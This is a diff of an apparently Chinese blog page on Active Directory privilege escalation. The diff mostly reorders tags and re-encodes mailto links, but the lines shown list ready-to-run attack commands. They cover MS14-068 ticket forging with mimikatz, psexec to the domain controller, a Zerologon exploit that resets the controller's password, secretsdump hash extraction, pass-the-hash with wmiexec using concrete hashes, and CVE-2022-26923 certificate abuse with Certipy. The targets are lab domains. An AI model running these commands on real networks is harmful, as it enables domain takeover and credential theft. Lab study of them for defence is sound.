@@ -16,10 +16,10 @@
 <meta property="article:published_time" content="2024-10-02T14:51:29.000Z">
 <meta property="article:modified_time" content="2024-12-30T09:37:32.584Z">
 <meta property="article:author" content="Ca1m">
-<meta property="article:tag" content="web">
 <meta property="article:tag" content="权限提升">
-<meta property="article:tag" content="域">
+<meta property="article:tag" content="web">
 <meta property="article:tag" content="内网">
+<meta property="article:tag" content="域">
 <meta name="twitter:card" content="summary">
     
     
@@ -246,11 +246,11 @@
 <p>net time &#x2F;domain	&#x2F;&#x2F;查看域内控制地址</p>
 <p>net config workstation		</p>
 <p>ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</p>
-<p>ms14-068.exe -u <a href="mailto:&#109;&#97;&#x72;&#x79;&#64;&#103;&#111;&#100;&#x2e;&#111;&#x72;&#x67;">&#109;&#97;&#x72;&#x79;&#64;&#103;&#111;&#100;&#x2e;&#111;&#x72;&#x67;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org		&#x2F;&#x2F;会保存票据等一些信息</p>
+<p>ms14-068.exe -u <a href="mailto:&#109;&#97;&#114;&#121;&#64;&#103;&#111;&#100;&#x2e;&#111;&#x72;&#103;">&#109;&#97;&#114;&#121;&#64;&#103;&#111;&#100;&#x2e;&#111;&#x72;&#103;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org		&#x2F;&#x2F;会保存票据等一些信息</p>
 <p>&#x2F;&#x2F;下面是mimikaz工具</p>
 <p>kerberos::list</p>
 <p>kerberos::purge		&#x2F;&#x2F;清除票据</p>
-<p>kerberos::ptc “<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x74;&#x65;&#x73;&#116;&#48;&#50;&#x40;&#116;&#101;&#115;&#116;&#x2e;&#108;&#97;&#98;&#x2e;&#x63;&#99;&#97;&#99;&#104;&#x65;">&#x54;&#x47;&#x54;&#x5f;&#x74;&#x65;&#x73;&#116;&#48;&#50;&#x40;&#116;&#101;&#115;&#116;&#x2e;&#108;&#97;&#98;&#x2e;&#x63;&#99;&#97;&#99;&#104;&#x65;</a>“		&#x2F;&#x2F;导入票据</p>
+<p>kerberos::ptc “<a href="mailto:&#x54;&#x47;&#x54;&#95;&#116;&#101;&#x73;&#116;&#48;&#x32;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#108;&#97;&#x62;&#x2e;&#99;&#x63;&#97;&#99;&#x68;&#x65;">&#x54;&#x47;&#x54;&#95;&#116;&#101;&#x73;&#116;&#48;&#x32;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#108;&#97;&#x62;&#x2e;&#99;&#x63;&#97;&#99;&#x68;&#x65;</a>“		&#x2F;&#x2F;导入票据</p>
 <p>dir\OWA2010CN-God.god.org\C$</p>
 <p>psexec \OWA2010CN-God.god.org cmd		&#x2F;&#x2F;链接域控cmd</p>
 <h2 id="WIN-AD域控提权-CVE-2021-42287-影响win服务器全系列到22"><a href="#WIN-AD域控提权-CVE-2021-42287-影响win服务器全系列到22" class="headerlink" title="WIN-AD域控提权-CVE-2021-42287	&#x2F;&#x2F;影响win服务器全系列到22"></a>WIN-AD域控提权-CVE-2021-42287	&#x2F;&#x2F;影响win服务器全系列到22</h2><p>只需要域用户账号密码</p>
@@ -268,7 +268,7 @@
 <p>重置空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</p>
 <p>连接后导出：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass	&#x2F;&#x2F;导出所有hash</p>
 <p>WMI连接反弹：</p>
-<p>python3 wmiexec.py god&#x2F;<a href="mailto:&#97;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#x61;&#116;&#x6f;&#x72;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#51;&#x2e;&#50;&#x31;">&#97;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#x61;&#116;&#x6f;&#x72;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#51;&#x2e;&#50;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</p>
+<p>python3 wmiexec.py god&#x2F;<a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#x72;&#97;&#116;&#111;&#114;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#51;&#46;&#x32;&#x31;">&#x61;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#x72;&#97;&#116;&#111;&#114;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#51;&#46;&#x32;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</p>
 <h2 id="WIN-AD域控提权-CVE-2022-26923"><a href="#WIN-AD域控提权-CVE-2022-26923" class="headerlink" title="WIN-AD域控提权-CVE-2022-26923"></a>WIN-AD域控提权-CVE-2022-26923</h2><p>三个利用文件</p>
 <p>在kali203中使用可能会冲突，用kali2022版本可以解决</p>
 <p>前提条件：</p>
@@ -288,7 +288,7 @@
 <p>攻击机执行&#x2F;三个利用目录，记得切换</p>
 <p>1、申请证书：（Certipy）</p>
 <p>certipy req ‘域&#x2F;test:Pass123@域控名字’ -ca xiaodi-DC-CA -template User -debug</p>
-<p>certipy req ‘xiaodi.local&#x2F;test:<a href="mailto:&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#x40;&#x44;&#67;&#46;&#120;&#x69;&#x61;&#111;&#100;&#105;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;">&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#x40;&#x44;&#67;&#46;&#120;&#x69;&#x61;&#111;&#100;&#105;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a>‘ -ca xiaodi-DC-CA -template User -debug</p>
+<p>certipy req ‘xiaodi.local&#x2F;test:<a href="mailto:&#80;&#x61;&#x73;&#x73;&#x31;&#x32;&#51;&#64;&#x44;&#67;&#46;&#x78;&#x69;&#x61;&#111;&#100;&#105;&#46;&#x6c;&#x6f;&#99;&#x61;&#x6c;">&#80;&#x61;&#x73;&#x73;&#x31;&#x32;&#51;&#64;&#x44;&#67;&#46;&#x78;&#x69;&#x61;&#111;&#100;&#105;&#46;&#x6c;&#x6f;&#99;&#x61;&#x6c;</a>‘ -ca xiaodi-DC-CA -template User -debug</p>
 <p>这步操作会保存一个test.pfx文件</p>
 <p>2、检测证书（Certipy）</p>
 <p>certipy auth -pfx test.pfx</p>
@@ -304,7 +304,7 @@
 <p>7、获取HASH：（impacket）</p>
 <p>python3 secretsdump.py ‘xiaodi.local&#x2F;dc$@DC.xiaodi.local’ -hashes :b6046c1026699b59301ff66341838df4</p>
 <p>8、利用HASH：（impacket）</p>
-<p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#49;&#49;&#49;">&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#49;&#49;&#49;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p>
+<p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#49;&#x31;&#x31;">&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#49;&#x31;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p>
 
   </div>
 </article>
